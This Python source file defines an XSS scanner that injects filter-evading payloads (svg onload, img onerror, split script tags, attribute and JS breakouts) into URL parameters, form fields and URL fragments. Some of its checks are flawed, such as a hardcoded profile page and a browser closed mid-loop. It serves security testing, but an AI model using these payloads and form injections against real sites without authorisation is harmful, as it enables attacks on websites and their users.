import asyncio
import httpx
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode
import json
from typing import List, Dict
from rich.console import Console
from rich.table import Table
from pathlib import Path

from openrecon.core.colors import Colors
from openrecon.core.progress import ProgressTracker
from openrecon.core.payloadModels import reflected_payloads, stored_payloads, dom_payloads


console = Console()
tracker = ProgressTracker(console)

class AsyncXSSScanner:
    def __init__(self, options: Dict):
        self.options = options
        
        self.reflected_payloads = reflected_payloads
        self.stored_payloads = stored_payloads
        self.dom_payloads = dom_payloads
        
        self.payloads_tried_count = 0
        self.options.setdefault("filter_per_payload", 5)
        self.delay = options.get('delay', 0.5)
        self.blacklist = options.get('blacklist', ['.png', '.jpg', '.jpeg', '.svg', '.pdf'])
        self.verbose = options.get('verbose', False)
        self.max_concurrency = options.get('threads', 5)
        self.user_agent = options.get('user_agent', 'Mozilla/5.0')
        self.scan_type = options.get('type', 'reflected')  # reflected, stored, dom, all
        self.cookies = {}
        cookie_header = options.get("cookie")
        if cookie_header:
            parts = [c.strip() for c in cookie_header.split(";")]
            for part in parts:
                if "=" in part:
                    k, v = part.split("=", 1)
                    self.cookies[k.strip()] = v.strip()

    def filter_payload(self, payload: str, context: str = "generic") -> List[str]:
        base = [payload]

        mutations = [
            payload.replace("alert", "confirm"),
            payload.replace("alert", "prompt"),
            payload.replace("<", "&lt;").replace(">", "&gt;"),
            payload.replace("(", "&#40;").replace(")", "&#41;"),
            payload.replace("script", "scr<script>ipt"),
            payload.replace('"', "'"),
            f"<scr<script>ipt>{payload}</scr<script>ipt>",
            f"<svg/onload={payload}>",
            f"<img src=x onerror={payload}>",
            f"<iframe src=javascript:{payload}></iframe>",
            f"<a href=javascript:{payload}>click</a>",
        ]

        if context == "attribute":
            mutations.extend([
                f'" onfocus={payload} autofocus="',
                f"' onerror={payload} '",
                f'" onmouseover={payload} ',
            ])
        elif context == "js":
            mutations.extend([
                f'";{payload}//',
                f"');{payload}//",
                f'"+{payload}+"',
            ])
        elif context == "html":
            mutations.extend([
                f"<body onload={payload}>",
                f"<details open ontoggle={payload}>",
            ])
            
        unique = list(set(base + mutations))
        return unique[:self.options.get("mutations_per_payload", 5)]


    async def validate_urls(self, urls: List[str]) -> List[str]:
        valid_urls = []
        async with httpx.AsyncClient(timeout=self.options.get("timeout", 10)) as client:
            for url in urls:
                try:
                    resp = await client.get(url)
                    if resp.status_code < 400:
                        valid_urls.append(url)
                        if self.verbose:
                            console.print(f"[+] Target OK: {url}", style=Colors.SUCCESS)
                    else:
                        console.print(f"[!] Target returned {resp.status_code}: {url}", style=Colors.ERROR)
                except Exception as e:
                    console.print(f"[!] Failed to reach {url}: {e}", style=Colors.ERROR)
        return valid_urls


    async def fetch(self, client: httpx.AsyncClient, url: str, method="GET", data=None) -> str:
        try:
            if method == "POST":
                resp = await client.post(url, data=data, timeout=self.options.get("timeout", 10))
            else:
                resp = await client.get(url, timeout=self.options.get("timeout", 10))
            if resp.status_code == 200:
                return resp.text
        except Exception as e:
            if self.verbose:
                console.print(f"Error fetching {url}: {e}", style=Colors.ERROR)
        return ""
    
    def response_differs(self, baseline: str, test: str, payload: str) -> bool:
        if baseline == test:
            return False

        baseline_lines = set(baseline.splitlines())
        test_lines = set(test.splitlines())
        diff = test_lines - baseline_lines

        return any(payload in line for line in diff)
    
    async def scan_stored(self, client: httpx.AsyncClient, urls: List[str]) -> List[Dict]:
        vulns = []
        base = urlparse(urls[0])
        profile_url = f"{base.scheme}://{base.netloc}/profile?id=1"

        for url in urls:
            html = await self.fetch(client, url)
            if not html:
                continue

            soup = BeautifulSoup(html, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                action = form.get('action') or url
                method = form.get('method', 'get').lower()
                full_action_url = action if action.startswith('http') else httpx.URL(url).join(action)

                inputs = form.find_all(['input', 'textarea'])
                input_names = [i.get('name') for i in inputs if i.get('name')]
                
                if self.verbose:
                    console.print(f"[*] Found form: action={action}, method={method.upper()}", style=Colors.INFO)
                    console.print(f"[*] Inputs: {input_names}")

                
                for payload in self.payloads:
                    for filterd in self.filter_payload(payload):
                        for param in input_names:
                            data = {name: (payload if name == param else 'test') for name in input_names}

                            if self.verbose:
                                console.print(f"[+] Trying payload: {payload} on param: {param} → {full_action_url}", style=Colors.VERBOSE_HIGHLIGHT)

                            # Submit the payload
                            await self.fetch(client, full_action_url, method=method.upper(), data=data)
                            await asyncio.sleep(0.3)

                            # Fetch the profile page to check
                            verify_html = await self.fetch(client, profile_url)

                            if payload in verify_html:
                                if self.is_potentially_vulnerable(verify_html, payload):
                                    if self.verbose:
                                        console.print(f"[!] Payload reflected! {payload}", style=Colors.VULNERABLE)
                                    vulns.append({
                                        'url': profile_url,
                                        'type': 'stored',
                                        'param_name': param,
                                        'payload': payload
                                    })
                                else:
                                    if self.verbose:
                                        console.print(f"[!] Payload found but not clearly reflected: {payload}", style=Colors.WARNING)
                            else:
                                if self.verbose:
                                    console.print(f"--> No reflection for: {payload}", style=Colors.VERBOSE)

        return vulns

    
    async def scan_reflected(self, client: httpx.AsyncClient, url: str) -> List[Dict]:
        vulns = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)
        if not params:
            return []

        baseline_html = await self.fetch(client, url)
        if not baseline_html:
            return []

        for param in params:
            for payload in self.payloads:
                for filtered in self.filter_payload(payload):
                    test_params = params.copy()
                    test_params[param] = [filtered]

                    query_params = {}
                    for k, v in test_params.items():
                        if isinstance(v, (list, tuple)):
                            query_params[k] = v[0]
                        else:
                            query_params[k] = str(v)

                    full_url = f"{base_url}?{urlencode(query_params)}"

                    if self.verbose:
                        console.print(
                            f"[+]Trying payload: {filtered} in param: {param} → {full_url}", style=Colors.VERBOSE_HIGHLIGHT
                        )

                    html = await self.fetch(client, full_url)
                    if not html:
                        continue

                    if filtered in html and self.response_differs(baseline_html, html, filtered):
                        if self.is_potentially_vulnerable(html, filtered):
                            if self.verbose:
                                console.print(f"[+] Reflected XSS detected: {filtered}", style=Colors.VULNERABLE)
                            vulns.append({
                                'url': full_url,
                                'type': 'reflected',
                                'param_name': param,
                                'payload': filtered
                            })
                        elif self.verbose:
                            console.print(f"[!] Payload found but context is unclear: {filtered}", style=Colors.WARNING)
                    elif self.verbose:
                        console.print(f"--> No reflection or no diff for: {filtered}", style=Colors.VERBOSE)

        return vulns


    async def scan_dom(self, urls: List[str]) -> List[Dict]:
        vulns = []
        try:
            from playwright.async_api import async_playwright
        except ImportError:
            console.print("Playwright is not installed. Run: pip install playwright && playwright install", style=Colors.CRITICAL)
            return []

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await browser.new_page()

            for url in urls:
                for payload in self.payloads:
                    for filterd in self.filter_payload(payload):
                        full_url = f"{url}#{payload}"
                        if self.verbose:
                            console.print(f"[+] Trying DOM payload: {payload}", style=Colors.VERBOSE_HIGHLIGHT)
                        try:
                            await page.goto(full_url, wait_until="domcontentloaded")
                            await asyncio.sleep(0.5)

                            found = await page.evaluate(
                                """(payload) => {
                                    return document.body.innerHTML.includes(payload) ||
                                        document.location.hash.includes(payload) ||
                                        document.URL.includes(payload);
                                }""",
                                payload
                            )
                            
                            if found:
                                if self.verbose:
                                    console.print(f"[+] DOM-based XSS detected! {payload}", style=Colors.VULNERABLE)
                                vulns.append({
                                    'url': full_url,
                                    'type': 'dom',
                                    'param_name': 'fragment or URL',
                                    'payload': payload
                                })
                            else:
                                if self.verbose:
                                    console.print(f"--> No DOM XSS for: {payload}", style=Colors.VERBOSE)

                        except Exception as e:
                            if self.verbose:
                                console.print(f"DOM check failed for {full_url}: {e}", style=Colors.ERROR)
                            continue

                await browser.close()

            return vulns
    
    def is_potentially_vulnerable(self, html: str, payload: str) -> bool:
        soup = BeautifulSoup(html, 'html.parser')
        for tag in soup.find_all():
            for attr in tag.attrs:
                val = tag.attrs[attr]
                if isinstance(val, list):
                    val = ' '.join(val)
                if payload in str(val):
                    return True
            if payload in tag.text:
                return True
        return payload in html

    async def run(self, urls: List[str]) -> List[Dict]:
        # Validate URLs before scanning
        urls = await self.validate_urls(urls)
        if not urls:
            console.print("[!] No reachable URLs. Scan aborted.", style=Colors.ERROR)
            return []

        all_vulns = []
        sem = asyncio.Semaphore(self.max_concurrency)
        
        if self.scan_type == "reflected":
            self.payloads = self.reflected_payloads
        elif self.scan_type == "stored":
            self.payloads = self.stored_payloads
        elif self.scan_type == "dom":
            self.payloads = self.dom_payloads
        elif self.scan_type == "all":
            self.payloads = []

        
        async with httpx.AsyncClient(headers={'User-Agent': self.user_agent}, cookies=self.cookies) as client:
            
            if self.verbose:
                console.print(f"Using cookies: {self.cookies}", style=Colors.VERBOSE_HIGHLIGHT)

            async def scan_url(url: str):
                async with sem:
                    results = []
                    if self.scan_type in ["reflected"]:
                        results.extend(await self.scan_reflected(client, url))
                    return results

            if self.scan_type == "all":
                # 1. Reflected
                console.print("\n -- Reflected XSS Scan --", style=Colors.SECTION_HEADER)
                self.payloads = self.reflected_payloads
                self.payloads_tried_count += len(self.payloads)
                
                reflected_tasks = [scan_url(url) for url in urls]
                reflected_results = await asyncio.gather(*reflected_tasks)
                for r in reflected_results:
                    all_vulns.extend(r)
                    
                # 2. Stored
                console.print("\n -- Stored XSS Scan --", style=Colors.SECTION_HEADER)
                self.payloads = self.stored_payloads
                self.payloads_tried_count += len(self.payloads)
                all_vulns.extend(await self.scan_stored(client, urls))
                
                # 3. DOM
                console.print("\n -- DOM XSS Scan --", style=Colors.SECTION_HEADER)
                self.payloads = self.dom_payloads
                self.payloads_tried_count += len(self.payloads)
                all_vulns.extend(await self.scan_dom(urls))
                
            else:
                self.payloads_tried_count += len(self.payloads)
                
                if self.scan_type == "reflected":
                    scan_tasks = [scan_url(url) for url in urls]
                    reflected_results = await asyncio.gather(*scan_tasks)
                    for r in reflected_results:
                        all_vulns.extend(r)

                if self.scan_type == "stored":
                    all_vulns.extend(await self.scan_stored(client, urls))

                if self.scan_type == "dom":
                    all_vulns.extend(await self.scan_dom(urls))

            return all_vulns

    def display_results(self, vulns: List[Dict]):
        if not vulns:
            console.print("[yellow]No XSS vulnerabilities found.[/yellow]")
            return

        table = Table(title="XSS Vulnerabilities")
        table.add_column("URL")
        table.add_column("Type", style=Colors.WARNING)
        table.add_column("Parameter", style="yellow")
        table.add_column("Payload", style=Colors.INFO)

        for v in vulns:
            table.add_row(v['url'], v['type'], v['param_name'], v['payload'])

        console.print((f"[bold green]Found {len(vulns)} vulnerabilities[/bold green]"))
        console.print(table)

        # Fix the potential set issue here - convert to list before calculating length
        scanned_urls = list(set(v['url'] for v in vulns))
        
        tracker.display_summary("Scan Summary", [
            f"Scanned URLs: {len(scanned_urls)}",
            f"Vulnerabilities Found: {len(vulns)}",
            f"Payloads Tried: {self.payloads_tried_count}"
        ])